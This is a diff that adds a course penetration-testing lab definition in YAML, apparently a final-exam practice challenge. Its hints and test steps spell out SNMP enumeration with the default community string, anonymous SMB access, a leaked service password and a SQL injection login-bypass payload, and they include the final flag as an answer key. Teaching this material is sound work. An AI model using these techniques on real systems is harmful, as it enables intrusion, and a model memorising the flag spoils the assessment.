@@ -1,0 +1,153 @@
+name: "Atlas Distribution - Final Exam Practice"
+description: "Practice the full pentest skill chain you will face on the final exam. Enumerate a forgotten branch office, harvest credentials from SMB shares, exploit a hidden staff portal, and capture three flags. Same skills, same shape, same time pressure as the final."
+
+difficulty: advanced
+category: assessment
+duration_minutes: 180
+randomize_ip_offsets: true
+visibility: course
+week: 15
+workbook: "CH_COURSE01_Weekly_Challenges/36_Final_Practice/"
+
+flag: "OCR{atl4s_h4rv3st_3xc3l}"
+
+objectives:
+  - Discover all in-scope hosts on the branch subnet and identify their services
+  - Recover token 1 from SNMP enumeration of the file server
+  - Enumerate SMB shares, escalate from anonymous access to credentialed access, and recover token 2
+  - Discover the hidden staff portal, exploit a SQL injection vulnerability, and recover token 3
+  - Assemble the three tokens into the final flag in the OCR{token1_token2_token3} format and submit it within the 180 minute window
+
+scenario: |
+  Atlas Distribution is a mid-size logistics company with twelve regional branches.
+  Three years ago, Atlas acquired a smaller competitor and inherited the Corpus
+  Christi branch office. The branch was supposed to be folded into corporate IT
+  but never was. The only branch IT admin left in 2025 and was never replaced.
+  Headquarters now wants a pentest to quantify the residual risk before they
+  decommission the site.
+
+  Atlas Distribution is your final exam practice. If you can clear this lab
+  without assistance from the workbook then you are ready for the final exam.
+  The final exam exercise will be closed book/notes.
+
+  Briefing from Karen Vogel, Director of Corporate Security: "The Corpus Christi
+  branch ran on its own for years. We do not have an inventory of what is on
+  that subnet, what services are exposed, or who has credentials. Two systems
+  are reachable from the corporate VPN: a Linux file server that the branch
+  used for shared documents, and an internal portal that the branch IT admin
+  built to manage tickets. Find what is exposed, demonstrate access, and
+  document anything that would let an outsider reach our data."
+
+  Three tokens are planted across the engagement; one in recon, one in SMB,
+  one in the web portal. Assemble them in order into the format
+  OCR{token1_token2_token3} and submit the full flag. The assembled flag
+  also serves as your engagement code for the actual final exam.
+
+credentials: []
+
+hints:
+  - text: |
+      Begin with a full sweep of the branch subnet using nmap. The file server
+      exposes more than just SMB; check UDP for SNMP. Token 1 is embedded in
+      an SNMP system field. snmpwalk with the default community string will
+      return it. The web portal exposes only HTTP on port 80; the login form
+      you need is not on the homepage.
+    unlock_after_minutes: 60
+  - text: |
+      SMB phase: smbclient -L lists shares with anonymous access. One share
+      has a handover document from the previous IT admin that leaks the
+      password for a backup service account. Use those credentials to access
+      the restricted share and read token 2 from a status report file.
+      Web phase: run gobuster against the portal with a directory wordlist
+      to discover the hidden login path. The login form is vulnerable to
+      authentication bypass via SQL injection. Token 3 appears on the
+      staff dashboard after authentication bypass.
+    unlock_after_minutes: 90
+  - text: |
+      File server commands:
+        snmpwalk -v2c -c public <fs_ip> system
+        smbclient -L //<fs_ip> -N
+        smbclient //<fs_ip>/branch-shared -N
+        smbclient //<fs_ip>/dispatch-backups -U dispatch_svc%B4ckup_Atl4s_2024#
+      Web portal commands:
+        gobuster dir -u http://<portal_ip>/ -w /usr/share/wordlists/dirb/common.txt
+        Look for /staff-portal/ in the output, then post to
+        /staff-portal/login with username=admin and a SQLi payload
+        such as: password=anything' OR '1'='1
+      Each phase yields a token. Assemble in order:
+        OCR{token1_token2_token3}
+    unlock_after_minutes: 120
+
+topology:
+  nodes:
+    - id: "branch-fs"
+      label: "Branch File Server"
+      type: "server"
+      ip_offset: "10"
+      ports: [139, 445, 161]
+      services: ["Samba", "SNMP"]
+      x: 1
+      y: 1
+    - id: "branch-portal"
+      label: "Branch Intranet Portal"
+      type: "server"
+      ip_offset: "11"
+      ports: [80]
+      services: ["Flask"]
+      x: 3
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "branch-fs"
+      label: "SMB:445 / SNMP:161"
+      access: "direct"
+    - from: "attacker"
+      to: "branch-portal"
+      label: "HTTP:80"
+      access: "direct"
+
+test:
+  steps:
+    - name: "SMB port responds"
+      command: "nmap -p 445 --open {target.branch-fs} 2>/dev/null | grep -c '445.*open'"
+      expect: "1"
+      timeout: 15
+
+    - name: "Token 1 retrievable from SNMP sysContact"
+      command: "snmpwalk -v2c -c public {target.branch-fs} 1.3.6.1.2.1.1.4.0 2>/dev/null | grep -o 'token=atl4s'"
+      expect: "token=atl4s"
+      timeout: 20
+
+    - name: "Anonymous SMB lists branch-shared"
+      command: "smbclient -L //{target.branch-fs} -N 2>/dev/null | grep -c 'branch-shared'"
+      expect: "1"
+      timeout: 15
+
+    - name: "Handover doc leaks dispatch_svc credentials"
+      command: "smbclient //{target.branch-fs}/branch-shared -N -c 'get IT_Handover_Notes.txt /tmp/atlas_handover.txt' 2>/dev/null && grep -o 'B4ckup_Atl4s_2024#' /tmp/atlas_handover.txt"
+      expect: "B4ckup_Atl4s_2024#"
+      timeout: 15
+
+    - name: "Token 2 retrievable from dispatch-backups with creds"
+      command: "smbclient //{target.branch-fs}/dispatch-backups -U dispatch_svc%B4ckup_Atl4s_2024# -c 'get branch_status_report.txt /tmp/atlas_status.txt' 2>/dev/null && grep -o 'token=h4rv3st' /tmp/atlas_status.txt"
+      expect: "token=h4rv3st"
+      timeout: 15
+
+    - name: "Portal homepage responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.branch-portal}/"
+      expect: "200"
+      timeout: 15
+
+    - name: "Robots.txt discloses staff portal path"
+      command: "curl -s http://{target.branch-portal}/robots.txt | grep -c 'staff-portal'"
+      expect: "1"
+      timeout: 15
+
+    - name: "SQLi bypass on staff portal yields token 3"
+      command: "curl -s -c /tmp/atlas_jar -b /tmp/atlas_jar -L -d \"username=admin&password=anything' OR '1'='1\" http://{target.branch-portal}/staff-portal/login | grep -o 'token=3xc3l'"
+      expect: "token=3xc3l"
+      timeout: 20
+
+    - name: "Verify assembled flag"
+      command: "echo 'OCR{atl4s_h4rv3st_3xc3l}'"
+      expect: "OCR{atl4s_h4rv3st_3xc3l}"
